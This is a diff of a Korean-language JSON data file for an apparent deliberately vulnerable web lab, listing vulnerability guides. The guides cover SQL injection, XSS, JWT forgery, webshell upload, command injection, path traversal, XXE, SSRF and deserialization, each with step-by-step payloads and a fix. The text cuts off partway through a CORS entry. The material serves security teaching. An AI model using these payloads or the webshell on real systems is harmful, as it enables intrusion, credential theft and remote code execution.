@@ -5,555 +5,922 @@
     "flag_format": "BLACKOUT{<engine>_<vuln>_<token>}"
   },
   "categories": [
-    { "key": "all",  "label": "🔵 전체" },
-    { "key": "sqli", "label": "💉 SQL 인젝션" },
-    { "key": "xss",  "label": "📜 XSS" },
-    { "key": "auth", "label": "🔑 인증·권한" },
-    { "key": "file", "label": "📁 파일·명령" },
-    { "key": "adv",  "label": "⚡ 고급·로직" }
+    {
+      "key": "all",
+      "label": "🔵 전체"
+    },
+    {
+      "key": "sqli",
+      "label": "💉 SQL 인젝션"
+    },
+    {
+      "key": "xss",
+      "label": "📜 XSS"
+    },
+    {
+      "key": "auth",
+      "label": "🔑 인증·권한"
+    },
+    {
+      "key": "file",
+      "label": "📁 파일·명령"
+    },
+    {
+      "key": "adv",
+      "label": "⚡ 고급·로직"
+    }
   ],
   "vulns": [
     {
-      "id": 1, "category": "sqli", "difficulty": "easy",
+      "id": 1,
+      "category": "sqli",
+      "difficulty": "easy",
       "title": "SQL Injection — 인증 우회 (Authentication Bypass)",
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/sql-injection",
       "goal": "로그인 쿼리가 문자열 연결로 조립되는 점을 이용해 비밀번호 없이 로그인한다.",
       "route": "/login",
       "steps": [
-        { "desc": "아이디 칸에 입력(비밀번호는 아무 값):", "payload": "admin' -- " },
-        { "desc": "또는 항상 참 조건:", "payload": "' OR '1'='1' -- " },
-        { "desc": "실제 조립되는 쿼리", "payload": "SELECT * FROM users WHERE username='admin' -- ' AND password='...'" }
+        {
+          "desc": "로그인 페이지(/login)로 이동한다. 아이디 칸에 아래를 입력하고 비밀번호는 아무 값이나 넣고 로그인",
+          "payload": "admin'-- "
+        },
+        {
+          "desc": "또는 '항상 참' 조건으로도 된다",
+          "payload": "' OR '1'='1'-- "
+        },
+        {
+          "desc": "성공하면 상단 네비게이션에 '관리자' 메뉴가 뜨고 admin 으로 로그인된 상태가 된다",
+          "payload": "(비밀번호 조건이 -- 로 주석 처리되어 무력화됨)"
+        }
       ],
-      "fix": "파라미터라이즈드 쿼리(프리페어드 스테이트먼트) 사용. 사용자 입력을 쿼리 문자열에 직접 넣지 않는다."
+      "fix": "파라미터라이즈드 쿼리(프리페어드 스테이트먼트) 사용. 사용자 입력을 쿼리 문자열에 직접 넣지 않는다.",
+      "detail": "로그인 쿼리가 사용자 입력을 그대로 문자열에 이어 붙여 만들어집니다. 아이디 칸에서 작은따옴표로 문자열을 닫고 주석(-- )으로 뒷부분을 무력화하면 비밀번호 조건이 사라져 첫 번째 사용자(admin)로 로그인됩니다.",
+      "diagram": "입력 username = admin'-- \n          │\nSELECT * FROM users WHERE username='admin'-- ' AND password='<md5>'\n                          └──── 참 ────┘  └─ 주석으로 무시 ─┘\n→ WHERE username='admin' 만 남음 → admin 행 반환"
     },
     {
-      "id": 2, "category": "sqli", "difficulty": "medium",
+      "id": 2,
+      "category": "sqli",
+      "difficulty": "medium",
       "title": "SQL Injection — UNION 데이터 추출",
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/sql-injection/union-attacks",
       "goal": "검색 파라미터에서 UNION SELECT로 users 테이블의 자격증명을 추출한다.",
       "route": "/search?q=",
       "steps": [
-        { "desc": "컬럼 수 확인(ORDER BY 증가)", "payload": "x' ORDER BY 3-- " },
-        { "desc": "UNION으로 계정/해시 추출", "payload": "x' UNION SELECT username, password, role FROM users-- " }
+        {
+          "desc": "먼저 주입 지점을 찾는다. 홈 상단 검색창(/?q=)에 작은따옴표 하나만 넣어 DB 오류(쿼리 노출)가 나는지 확인",
+          "payload": "'"
+        },
+        {
+          "desc": "컬럼 수를 센다. 오류가 사라질 때까지 ORDER BY 숫자를 올린다(3은 성공, 4는 오류 → 컬럼 3개)",
+          "payload": "x' ORDER BY 3-- "
+        },
+        {
+          "desc": "UNION 자리/표시 컬럼 확인(두 번째 컬럼이 화면 제목에 보임)",
+          "payload": "x' UNION SELECT 1,2,3-- "
+        },
+        {
+          "desc": "전체 계정과 비밀번호 해시 추출",
+          "payload": "x' UNION SELECT username, password, role FROM users-- "
+        },
+        {
+          "desc": "관리자만 콕 집어 해시 추출",
+          "payload": "x' UNION SELECT username, password, '-' FROM users WHERE username='admin'-- "
+        },
+        {
+          "desc": "얻은 MD5 해시를 크랙한다(온라인 레인보우/사전). 예: 0192023a7bbd73250516f069df18b500 → admin123 → 이제 관리자 로그인 가능",
+          "payload": "admin / admin123"
+        }
       ],
-      "fix": "파라미터 바인딩 + 최소 권한. 검색은 화이트리스트 컬럼/정렬만 허용."
+      "fix": "파라미터 바인딩 + 최소 권한. 검색은 화이트리스트 컬럼/정렬만 허용.",
+      "detail": "검색 결과 쿼리는 3개 컬럼(id, title, author)을 반환합니다. UNION SELECT 로 같은 3개 자리에 users 값을 끼워 넣으면 제목 칸에 자격증명이 그대로 출력됩니다. 컬럼 수는 ORDER BY n 으로 먼저 확인합니다.",
+      "diagram": "원본:  SELECT id, title, author FROM posts WHERE ...\n주입:  ...' UNION SELECT username, password, role FROM users-- \n            컬럼수 3 = 3 (반드시 일치)\n결과 행:  [username] [password(md5)] [role]\n              └ 화면의 '제목' 칸에 해시가 노출"
     },
     {
-      "id": 3, "category": "sqli", "difficulty": "medium",
+      "id": 3,
+      "category": "sqli",
+      "difficulty": "medium",
       "title": "SQL Injection — 스키마 열거 (information_schema)",
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/sql-injection/examining-the-database",
       "goal": "MySQL/MariaDB 시스템 뷰(information_schema)로 테이블·컬럼 구조를 알아낸다.",
       "route": "/search?q=",
       "steps": [
-        { "desc": "테이블 목록", "payload": "x' UNION SELECT table_name, table_schema, '3' FROM information_schema.tables WHERE table_schema=database()-- " },
-        { "desc": "컬럼 목록", "payload": "x' UNION SELECT group_concat(column_name), '2', '3' FROM information_schema.columns WHERE table_name='users'-- " }
+        {
+          "desc": "현재 DB의 테이블 목록을 뽑는다(검색창 /?q=)",
+          "payload": "x' UNION SELECT table_name, table_schema, '3' FROM information_schema.tables WHERE table_schema=database()-- "
+        },
+        {
+          "desc": "users 테이블의 컬럼 이름을 뽑는다 → password 컬럼 존재 확인",
+          "payload": "x' UNION SELECT group_concat(column_name), '2', '3' FROM information_schema.columns WHERE table_name='users'-- "
+        },
+        {
+          "desc": "구조를 알았으니 UNION 데이터 추출(2번 가이드)로 해시를 뽑는다",
+          "payload": "x' UNION SELECT username, password, role FROM users-- "
+        }
       ],
-      "fix": "파라미터 바인딩 + DB 계정 권한 축소 + 상세 오류 메시지 숨김."
+      "fix": "파라미터 바인딩 + DB 계정 권한 축소 + 상세 오류 메시지 숨김.",
+      "diagram": "information_schema.tables   → 테이블 이름 수집\ninformation_schema.columns  → 컬럼 이름 수집\n        ↓\nusers(id, username, password, role, ...) 구조 확보 → UNION 추출 타겟 확정",
+      "detail": "테이블/컬럼 이름을 모를 때는 MySQL/MariaDB 의 시스템 뷰 information_schema 에서 메타데이터를 먼저 수집한다. database() 는 현재 접속한 DB 이름을 돌려주므로, 그 안의 테이블·컬럼만 추려서 추출 타겟을 좁힌다."
     },
     {
-      "id": 4, "category": "sqli", "difficulty": "hard",
+      "id": 4,
+      "category": "sqli",
+      "difficulty": "hard",
       "title": "SQL Injection — 블라인드 / 2차 주입",
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/sql-injection/blind",
       "goal": "응답 차이(참/거짓)만으로 데이터를 한 글자씩 추출하거나, 저장된 값이 나중 쿼리에서 실행되는 2차 주입을 이해한다.",
       "route": "/search?q=",
       "steps": [
-        { "desc": "참 조건", "payload": "x' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='0'-- " },
-        { "desc": "2차 주입: 가입 시 저장한 username이 이후 관리자 화면 쿼리에서 실행됨", "payload": "회원가입 username 예: admin'-- " }
+        {
+          "desc": "참 조건",
+          "payload": "x' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='0'-- "
+        },
+        {
+          "desc": "2차 주입: 가입 시 저장한 username이 이후 관리자 화면 쿼리에서 실행됨",
+          "payload": "회원가입 username 예: admin'-- "
+        }
       ],
-      "fix": "입력 지점뿐 아니라 저장→재사용 경로까지 전부 파라미터 바인딩."
+      "fix": "입력 지점뿐 아니라 저장→재사용 경로까지 전부 파라미터 바인딩.",
+      "detail": "응답에 데이터가 직접 안 보일 때는 참/거짓(또는 시간 지연)의 차이로 한 글자씩 알아낸다. 또한 가입 시 저장한 값이 나중에 다른 쿼리에서 그대로 쓰이면(2차 주입) 저장 시점이 아니라 사용 시점에 주입이 터진다."
     },
     {
-      "id": 5, "category": "xss", "difficulty": "easy",
+      "id": 5,
+      "category": "xss",
+      "difficulty": "easy",
       "title": "Reflected XSS — 입력 즉시 반사",
       "owasp": "A03:2021 Injection (XSS)",
       "ref": "https://owasp.org/www-community/attacks/xss/",
       "goal": "검색어/파라미터가 이스케이프 없이 응답에 삽입되는 지점을 찾아 스크립트를 실행한다.",
       "route": "/search?q= 또는 /xss?input=",
       "steps": [
-        { "desc": "기본 페이로드", "payload": "<script>alert(document.domain)</script>" },
-        { "desc": "이미지 onerror", "payload": "<img src=x onerror=alert(1)>" }
+        {
+          "desc": "기본 페이로드",
+          "payload": "<script>alert(document.domain)</script>"
+        },
+        {
+          "desc": "이미지 onerror",
+          "payload": "<img src=x onerror=alert(1)>"
+        }
       ],
       "fix": "출력 시 컨텍스트별 인코딩(HTML 엔티티). 템플릿 자동 이스케이프 사용, |safe/raw 금지."
     },
     {
-      "id": 6, "category": "xss", "difficulty": "medium",
+      "id": 6,
+      "category": "xss",
+      "difficulty": "medium",
       "title": "Stored XSS — 게시글·댓글 저장형",
       "owasp": "A03:2021 Injection (XSS)",
       "ref": "https://portswigger.net/web-security/cross-site-scripting/stored",
       "goal": "글 제목/본문/댓글에 저장한 스크립트가 다른 사용자 화면에서 실행된다(세션 탈취 데모).",
       "route": "/post/write, /post/<id>/comment",
       "steps": [
-        { "desc": "쿠키 탈취 데모(로컬)", "payload": "<script>fetch('/api/collect?c='+document.cookie)</script>" },
-        { "desc": "제목에 삽입", "payload": "<img src=x onerror=alert('stored')>" }
+        {
+          "desc": "쿠키 탈취 데모(로컬)",
+          "payload": "<script>fetch('/api/collect?c='+document.cookie)</script>"
+        },
+        {
+          "desc": "제목에 삽입",
+          "payload": "<img src=x onerror=alert('stored')>"
+        }
       ],
-      "fix": "저장 시가 아니라 출력 시 인코딩. 자동 이스케이프 + CSP 적용."
+      "fix": "저장 시가 아니라 출력 시 인코딩. 자동 이스케이프 + CSP 적용.",
+      "detail": "입력을 '저장'한 뒤 '출력'할 때 이스케이프하지 않는 것이 핵심입니다. 공격자가 한 번 심어두면 그 글/댓글을 보는 모든 사용자(관리자 포함)의 브라우저에서 스크립트가 실행됩니다.",
+      "diagram": "공격자 글 작성 ── content=<script>…</script> ──▶ DB 저장\n                                                   │\n피해자 글 열람 ◀── 서버가 이스케이프 없이 출력 ◀──┘\n     └ 피해자 브라우저에서 스크립트 실행(쿠키 탈취 등)"
     },
     {
-      "id": 7, "category": "xss", "difficulty": "medium",
+      "id": 7,
+      "category": "xss",
+      "difficulty": "medium",
       "title": "DOM 기반 XSS",
       "owasp": "A03:2021 Injection (XSS)",
       "ref": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
       "goal": "서버가 아닌 클라이언트 JS가 location.hash 등을 innerHTML로 넣는 지점을 악용.",
       "route": "/xss#",
       "steps": [
-        { "desc": "해시 기반", "payload": "#<img src=x onerror=alert('dom')>" }
+        {
+          "desc": "해시 기반",
+          "payload": "#<img src=x onerror=alert('dom')>"
+        }
       ],
       "fix": "innerHTML 대신 textContent. 신뢰할 수 없는 소스를 DOM 싱크에 직접 쓰지 않기."
     },
     {
-      "id": 8, "category": "auth", "difficulty": "easy",
+      "id": 8,
+      "category": "auth",
+      "difficulty": "easy",
       "title": "약한 비밀번호 해시 (MD5, 솔트 없음)",
       "owasp": "A02:2021 Cryptographic Failures",
       "ref": "https://owasp.org/www-community/vulnerabilities/Use_of_a_Broken_or_Risky_Cryptographic_Algorithm",
       "goal": "UNION으로 얻은 MD5 해시를 레인보우/사전으로 즉시 복호화.",
       "route": "-",
       "steps": [
-        { "desc": "탈취한 해시 예", "payload": "0192023a7bbd73250516f069df18b500  →  admin123" }
+        {
+          "desc": "탈취한 해시 예",
+          "payload": "0192023a7bbd73250516f069df18b500  →  admin123"
+        }
       ],
       "fix": "bcrypt/argon2 등 솔트+느린 해시 사용."
     },
     {
-      "id": 9, "category": "auth", "difficulty": "hard",
+      "id": 9,
+      "category": "auth",
+      "difficulty": "hard",
       "title": "JWT 위조 — 약한 시크릿",
       "owasp": "A07:2021 Identification and Authentication Failures",
       "ref": "https://portswigger.net/web-security/jwt",
       "goal": "추측 가능한 시크릿('secret' 등)으로 role=admin 토큰을 위조한다.",
       "route": "/api/jwt_verify",
       "steps": [
-        { "desc": "약한 시크릿으로 서명한 토큰 제출", "payload": "{\"alg\":\"HS256\"} . {\"username\":\"admin\",\"role\":\"admin\"}  (secret='secret')" }
+        {
+          "desc": "jwt.io(또는 스크립트)로 HS256 토큰을 만든다. Payload 를 아래로, Secret 칸에 secret 입력",
+          "payload": "{\"username\":\"admin\",\"role\":\"admin\"}  · secret = secret"
+        },
+        {
+          "desc": "생성된 토큰을 /api/jwt_verify 로 POST(JSON)",
+          "payload": "{\"token\":\"<위조한 토큰>\"}"
+        },
+        {
+          "desc": "응답에 status=SUCCESS 와 flag 가 나오면 관리자 토큰 위조 성공",
+          "payload": "(secret 이 약하면 서명을 그대로 재생성할 수 있다)"
+        }
       ],
-      "fix": "충분히 긴 무작위 시크릿(환경변수), 서버측 키 관리, alg 고정."
+      "fix": "충분히 긴 무작위 시크릿(환경변수), 서버측 키 관리, alg 고정.",
+      "diagram": "JWT = base64url(header) . base64url(payload) . signature\n  header   {\"alg\":\"HS256\"}\n  payload  {\"role\":\"admin\"}      ← 권한 위조\n  sig      HMAC-SHA256(secret)   ← secret='secret' 이면 서명 재생성 가능"
     },
     {
-      "id": 10, "category": "auth", "difficulty": "hard",
+      "id": 10,
+      "category": "auth",
+      "difficulty": "hard",
       "title": "JWT alg=none 서명 우회",
       "owasp": "A07:2021 Identification and Authentication Failures",
       "ref": "https://portswigger.net/web-security/jwt/algorithm-confusion",
       "goal": "alg를 none으로 바꾸고 서명을 비워 검증을 우회.",
       "route": "/api/jwt_verify",
       "steps": [
-        { "desc": "헤더 alg=none, 서명부 제거", "payload": "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." }
+        {
+          "desc": "서명 검증을 건너뛰게 만든다. 헤더 alg 를 none, payload 에 role=admin, 서명부는 빈 채로 둔다",
+          "payload": "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."
+        },
+        {
+          "desc": "위 토큰을 /api/jwt_verify 로 POST",
+          "payload": "{\"token\":\"eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.\"}"
+        },
+        {
+          "desc": "서버가 alg=none 을 허용하면 서명 없이 통과 → 관리자 권한 payload 가 그대로 받아들여짐",
+          "payload": "(점 뒤 서명 자리를 반드시 비워 둘 것)"
+        }
       ],
-      "fix": "허용 알고리즘 화이트리스트 지정, none 금지, 서명 필수 검증."
+      "fix": "허용 알고리즘 화이트리스트 지정, none 금지, 서명 필수 검증.",
+      "diagram": "정상:  {\"alg\":\"HS256\"} . {payload} . <서명>\n우회:  {\"alg\":\"none\"}  . {\"role\":\"admin\"} .   ← 서명부 비움\n       서버가 alg=none 을 허용하면 서명 검증을 건너뛰어 그대로 통과"
     },
     {
-      "id": 11, "category": "auth", "difficulty": "easy",
+      "id": 11,
+      "category": "auth",
+      "difficulty": "easy",
       "title": "쿠키 기반 권한 상승 (role=admin)",
       "owasp": "A01:2021 Broken Access Control",
       "ref": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
       "goal": "클라이언트 쿠키 role 값을 admin으로 바꿔 관리자 기능 접근.",
       "route": "/admin",
       "steps": [
-        { "desc": "개발자도구/프록시로 쿠키 수정", "payload": "Cookie: role=admin" }
+        {
+          "desc": "개발자도구/프록시로 쿠키 수정",
+          "payload": "Cookie: role=admin"
+        }
       ],
-      "fix": "권한은 서버 세션으로만 판정. 클라이언트 쿠키 값을 신뢰하지 않는다."
+      "fix": "권한은 서버 세션으로만 판정. 클라이언트 쿠키 값을 신뢰하지 않는다.",
+      "diagram": "권한 판정:  role = 쿠키['role'] ?? 세션['role'] ?? 'user'\n브라우저에서  Cookie: role=admin  으로 변조\n→ 서버가 클라이언트 쿠키를 신뢰 → 관리자 기능 접근"
     },
     {
-      "id": 12, "category": "auth", "difficulty": "medium",
+      "id": 12,
+      "category": "auth",
+      "difficulty": "medium",
       "title": "사용자 열거 + 무제한 브루트포스",
       "owasp": "A07:2021 Identification and Authentication Failures",
       "ref": "https://owasp.org/www-community/attacks/Brute_force_attack",
       "goal": "로그인/아이디찾기 응답 차이로 계정 존재를 구분하고, 잠금·레이트리밋이 없어 대입 공격이 가능함을 확인.",
       "route": "/login, /find_id",
       "steps": [
-        { "desc": "존재/비존재 응답 메시지 비교", "payload": "username=admin vs username=nope" }
+        {
+          "desc": "존재/비존재 응답 메시지 비교",
+          "payload": "username=admin vs username=nope"
+        }
       ],
       "fix": "동일한 일반 오류 메시지, 레이트 리밋/계정 잠금, 2단계 인증."
     },
     {
-      "id": 13, "category": "auth", "difficulty": "medium",
+      "id": 13,
+      "category": "auth",
+      "difficulty": "medium",
       "title": "Mass Assignment — 권한 필드 주입",
       "owasp": "A08:2021 Software and Data Integrity Failures",
       "ref": "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
       "goal": "회원가입/프로필 수정 폼에 role=admin 같은 미허용 필드를 추가해 권한 상승.",
       "route": "/register, /profile/edit",
       "steps": [
-        { "desc": "폼/바디에 추가 필드", "payload": "username=hacker&password=1234&role=admin&points=999999" }
+        {
+          "desc": "폼/바디에 추가 필드",
+          "payload": "username=hacker&password=1234&role=admin&points=999999"
+        }
       ],
       "fix": "허용 필드 화이트리스트 바인딩. role/points 등 민감 필드는 서버에서만 설정."
     },
     {
-      "id": 14, "category": "auth", "difficulty": "easy",
+      "id": 14,
+      "category": "auth",
+      "difficulty": "easy",
       "title": "IDOR — 타인 프로필 열람/수정",
       "owasp": "A01:2021 Broken Access Control",
       "ref": "https://portswigger.net/web-security/access-control/idor",
       "goal": "user_id 파라미터를 바꿔 권한 검사 없이 다른 사용자 정보에 접근.",
       "route": "/profile?user_id=",
       "steps": [
-        { "desc": "다른 사용자 id로 변경", "payload": "/profile?user_id=1" }
+        {
+          "desc": "다른 사용자 id로 변경",
+          "payload": "/profile?user_id=1"
+        }
       ],
       "fix": "객체 접근 시 소유자/권한 서버 검증. 추측 불가 식별자 + 접근통제."
     },
     {
-      "id": 15, "category": "auth", "difficulty": "medium",
+      "id": 15,
+      "category": "auth",
+      "difficulty": "medium",
       "title": "관리자 기능 접근통제 미흡 (Forced Browsing)",
       "owasp": "A01:2021 Broken Access Control",
       "ref": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
       "goal": "링크가 숨겨졌을 뿐 /admin/* 액션에 직접 요청하면 실행되는지 확인.",
       "route": "/admin, /admin/user/<id>/role",
       "steps": [
-        { "desc": "직접 POST로 권한 변경", "payload": "POST /admin/user/2/role  role=admin" }
+        {
+          "desc": "직접 POST로 권한 변경",
+          "payload": "POST /admin/user/2/role  role=admin"
+        }
       ],
       "fix": "모든 민감 라우트에 서버측 권한 미들웨어 적용(기본 거부)."
     },
     {
-      "id": 16, "category": "file", "difficulty": "hard",
+      "id": 16,
+      "category": "file",
+      "difficulty": "hard",
       "title": "무제한 파일 업로드 (웹셸)",
       "owasp": "A05:2021 Security Misconfiguration / Unrestricted Upload",
       "ref": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
       "goal": "확장자 검증이 없어 실행 가능한 파일을 올려 서버에서 명령 실행(엔진별 .php/.js 등).",
       "route": "/post/write (첨부)",
       "steps": [
-        { "desc": "PHP 엔진: 웹셸 업로드 후 접근", "payload": "shell.php: <?php system($_GET['c']); ?>  →  /uploads/shell.php?c=id" }
+        {
+          "desc": "로그인한 뒤(또는 SQLi 로 admin 우회 로그인) 글쓰기(/post/write)로 이동",
+          "payload": "admin'--  로 로그인 가능"
+        },
+        {
+          "desc": "로컬에 아래 내용으로 shell.php 파일을 만든다",
+          "payload": "<?php system($_GET['c']); ?>"
+        },
+        {
+          "desc": "글 제목/내용을 아무거나 쓰고 첨부파일로 shell.php 를 올린 뒤 등록",
+          "payload": "(확장자 검증이 없어 .php 그대로 저장됨)"
+        },
+        {
+          "desc": "업로드된 웹셸에 직접 접근해 명령을 실행",
+          "payload": "/uploads/shell.php?c=id"
+        },
+        {
+          "desc": "응답에 명령 결과(uid=…)가 나오면 RCE 성공. c 값을 바꿔 임의 명령 실행",
+          "payload": "/uploads/shell.php?c=cat%20/etc/passwd"
+        }
       ],
-      "fix": "확장자/MIME 화이트리스트, 실행권한 제거, 업로드 디렉터리 실행 차단, 난수 파일명."
+      "fix": "확장자/MIME 화이트리스트, 실행권한 제거, 업로드 디렉터리 실행 차단, 난수 파일명.",
+      "detail": "업로드 시 확장자/MIME 검증이 전혀 없고, 업로드 폴더의 .php 가 Apache PHP 핸들러로 실행됩니다. 두 조건이 겹쳐 '임의 파일 업로드 → 원격 코드 실행(RCE)'으로 이어집니다.",
+      "diagram": "글쓰기 첨부 ── shell.php (<?php system($_GET[c]); ?>) ──▶ /uploads/shell.php 저장\n                  (확장자 검증 없음)                           │\n브라우저 ── GET /uploads/shell.php?c=id ──▶ Apache 가 PHP 실행 → 명령 결과"
     },
     {
-      "id": 17, "category": "file", "difficulty": "medium",
+      "id": 17,
+      "category": "file",
+      "difficulty": "medium",
       "title": "경로 탐색 / 임의 파일 다운로드",
       "owasp": "A01:2021 Broken Access Control / Path Traversal",
       "ref": "https://owasp.org/www-community/attacks/Path_Traversal",
       "goal": "다운로드 파라미터에 ../ 를 넣어 업로드 폴더 밖 파일을 읽는다.",
       "route": "/download?file=",
       "steps": [
-        { "desc": "상위 경로 탐색", "payload": "/download?file=../../etc/passwd" },
-        { "desc": "앱 소스 획득", "payload": "/download?file=../lib.php (또는 /theme?name=php://filter...)" }
+        {
+          "desc": "상위 경로 탐색",
+          "payload": "/download?file=../../etc/passwd"
+        },
+        {
+          "desc": "앱 소스 획득",
+          "payload": "/download?file=../lib.php (또는 /theme?name=php://filter...)"
+        }
       ],
-      "fix": "경로 정규화 후 기준 디렉터리 포함 여부 검증, 파일명 화이트리스트."
+      "fix": "경로 정규화 후 기준 디렉터리 포함 여부 검증, 파일명 화이트리스트.",
+      "diagram": "기준 경로:  /var/www/html/uploads/<file>\n입력 file = ../lib.php\n→ /var/www/html/uploads/../lib.php = /var/www/html/lib.php (폴더 탈출)"
     },
     {
-      "id": 18, "category": "file", "difficulty": "hard",
+      "id": 18,
+      "category": "file",
+      "difficulty": "hard",
       "title": "OS 명령어 주입 (Command Injection)",
       "owasp": "A03:2021 Injection",
       "ref": "https://owasp.org/www-community/attacks/Command_Injection",
       "goal": "서버 진단(ping) 입력이 셸에 그대로 전달되어 임의 명령이 실행된다.",
       "route": "/ping",
       "steps": [
-        { "desc": "명령 연결", "payload": "127.0.0.1; id" },
-        { "desc": "파이프/백틱", "payload": "127.0.0.1 | whoami" }
+        {
+          "desc": "명령 연결",
+          "payload": "127.0.0.1; id"
+        },
+        {
+          "desc": "파이프/백틱",
+          "payload": "127.0.0.1 | whoami"
+        }
       ],
-      "fix": "셸 호출 금지(인자 배열 실행), 입력 화이트리스트, 라이브러리 사용."
+      "fix": "셸 호출 금지(인자 배열 실행), 입력 화이트리스트, 라이브러리 사용.",
+      "detail": "입력이 셸 명령 문자열에 그대로 삽입됩니다. ;  |  && 등 셸 메타문자로 추가 명령을 이어 붙일 수 있습니다.",
+      "diagram": "실행:  ping -c 2 <입력>\n입력 = 127.0.0.1; id\n→ 셸:  ping -c 2 127.0.0.1 ; id\n                            └ 별도 명령으로 실행"
     },
     {
-      "id": 19, "category": "adv", "difficulty": "hard",
+      "id": 19,
+      "category": "adv",
+      "difficulty": "hard",
       "title": "SSRF — 서버측 요청 위조",
       "owasp": "A10:2021 Server-Side Request Forgery",
       "ref": "https://portswigger.net/web-security/ssrf",
       "goal": "URL 미리보기 기능이 임의 주소로 요청을 보내 내부망/메타데이터에 접근.",
       "route": "/utils/url_preview?url=",
       "steps": [
-        { "desc": "내부 주소 접근", "payload": "http://127.0.0.1:8090/ 또는 http://169.254.169.254/" }
+        {
+          "desc": "내부 주소 접근",
+          "payload": "http://127.0.0.1:8090/ 또는 http://169.254.169.254/"
+        }
       ],
-      "fix": "아웃바운드 목적지 화이트리스트, 사설/링크로컬 IP 차단, 리다이렉트 제한."
+      "fix": "아웃바운드 목적지 화이트리스트, 사설/링크로컬 IP 차단, 리다이렉트 제한.",
+      "diagram": "브라우저 ──url=http://169.254.169.254/… ──▶ [랩 서버] ──대신 요청──▶ 내부망/메타데이터\n                                                      (SSRF: 서버가 공격자 대신 접속)"
     },
     {
-      "id": 20, "category": "adv", "difficulty": "easy",
+      "id": 20,
+      "category": "adv",
+      "difficulty": "easy",
       "title": "오픈 리다이렉트",
       "owasp": "A01:2021 Broken Access Control",
       "ref": "https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet",
       "goal": "리다이렉트 대상이 검증되지 않아 외부 피싱 사이트로 유도 가능.",
       "route": "/utils/url_preview?url=",
       "steps": [
-        { "desc": "외부로 리다이렉트", "payload": "//evil.example/login" }
+        {
+          "desc": "외부로 리다이렉트",
+          "payload": "//evil.example/login"
+        }
       ],
       "fix": "리다이렉트 대상 화이트리스트 또는 상대경로만 허용."
     },
     {
-      "id": 21, "category": "adv", "difficulty": "hard",
+      "id": 21,
+      "category": "adv",
+      "difficulty": "hard",
       "title": "XXE — XML 외부 엔티티",
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://portswigger.net/web-security/xxe",
       "goal": "외부 엔티티를 허용하는 XML 파서로 로컬 파일을 읽는다.",
       "route": "/api/import (XML POST)",
       "steps": [
-        { "desc": "파일 읽기 엔티티", "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>" }
+        {
+          "desc": "파일 읽기 엔티티",
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>"
+        }
       ],
       "fix": "외부 엔티티/DTD 비활성화, 안전한 파서 설정."
     },
     {
-      "id": 22, "category": "adv", "difficulty": "expert",
+      "id": 22,
+      "category": "adv",
+      "difficulty": "expert",
       "title": "안전하지 않은 역직렬화",
       "owasp": "A08:2021 Software and Data Integrity Failures",
       "ref": "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
       "goal": "신뢰할 수 없는 직렬화 데이터를 역직렬화해 객체 주입/원격 코드 실행.",
       "route": "/api/config",
       "steps": [
-        { "desc": "PHP: 객체 주입", "payload": "data=O:4:\"Evil\":0:{}  (unserialize)" },
-        { "desc": "Node: node-serialize IIFE", "payload": "{\"rce\":\"_$$ND_FUNC$$_function(){...}()\"}" },
-        { "desc": "Django: pickle 페이로드(base64)", "payload": "base64(pickle.dumps(Exploit()))" }
+        {
+          "desc": "PHP: 객체 주입",
+          "payload": "data=O:4:\"Evil\":0:{}  (unserialize)"
+        },
+        {
+          "desc": "Node: node-serialize IIFE",
+          "payload": "{\"rce\":\"_$$ND_FUNC$$_function(){...}()\"}"
+        },
+        {
+          "desc": "Django: pickle 페이로드(base64)",
+          "payload": "base64(pickle.dumps(Exploit()))"
+        }
       ],
-      "fix": "신뢰 경계 밖 데이터 역직렬화 금지. JSON 등 데이터 전용 포맷 + 서명/검증."
+      "fix": "신뢰 경계 밖 데이터 역직렬화 금지. JSON 등 데이터 전용 포맷 + 서명/검증.",
+      "diagram": "base64( O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";} )\n        └ unserialize() 가 Evil 객체 복원\n           → __wakeup() 자동 호출 → system($this->cmd) 실행"
     },
     {
-      "id": 23, "category": "adv", "difficulty": "expert",
+      "id": 23,
+      "category": "adv",
+      "difficulty": "expert",
       "title": "SSTI — 서버측 템플릿 인젝션",
       "owasp": "A03:2021 Injection",
       "ref": "https://portswigger.net/web-security/server-side-template-injection",
       "goal": "사용자 입력이 템플릿으로 렌더되어 표현식/코드가 실행된다.",
       "route": "/api/render (theme)",
       "steps": [
-        { "desc": "Jinja/Django 계열 탐지", "payload": "{{7*7}}" },
-        { "desc": "Node EJS/handlebars 계열", "payload": "<%= 7*7 %>" }
+        {
+          "desc": "Jinja/Django 계열 탐지",
+          "payload": "{{7*7}}"
+        },
+        {
+          "desc": "Node EJS/handlebars 계열",
+          "payload": "<%= 7*7 %>"
+        }
       ],
-      "fix": "사용자 입력을 템플릿 소스로 쓰지 않기. 로직리스 템플릿/샌드박스, 변수 바인딩만 허용."
+      "fix": "사용자 입력을 템플릿 소스로 쓰지 않기. 로직리스 템플릿/샌드박스, 변수 바인딩만 허용.",
+      "diagram": "입력이 템플릿 '소스'로 렌더됨:\n  {{ 7*7 }}  → 49   (표현식이 평가됨 = 코드 실행 신호)\n정상 설계는 입력을 '데이터'로만 바인딩해야 함"
     },
     {
-      "id": 24, "category": "adv", "difficulty": "medium",
+      "id": 24,
+      "category": "adv",
+      "difficulty": "medium",
       "title": "CORS 설정 오류",
       "owasp": "A05:2021 Security Misconfiguration",
